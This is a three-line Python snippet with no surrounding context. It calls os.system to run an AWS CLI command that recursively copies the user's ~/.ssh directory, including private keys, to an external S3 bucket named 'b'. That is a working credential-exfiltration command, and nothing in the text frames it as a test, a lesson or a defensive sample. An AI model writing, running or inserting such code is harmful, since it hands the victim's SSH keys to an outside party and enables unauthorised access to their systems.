import os
os.system("aws s3 cp " \
  "~/.ssh s3://b/ --recursive")
